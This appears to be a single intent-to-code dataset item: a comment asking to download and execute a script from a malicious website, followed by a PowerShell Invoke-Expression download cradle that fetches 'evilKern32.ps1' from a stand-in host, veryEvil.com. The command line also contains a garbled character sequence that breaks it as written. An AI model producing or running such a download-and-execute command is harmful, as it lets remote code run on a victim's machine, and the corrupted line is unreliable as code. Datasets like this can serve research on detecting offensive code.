# Natural language intent:
# Invoke Expression to download and execute a script from a malicious website.

Invoke-Expression -Command ï¿½IEX (New-Object Net.WebClient).DownloadString('http://veryEvil.com/evilKern32.ps1')
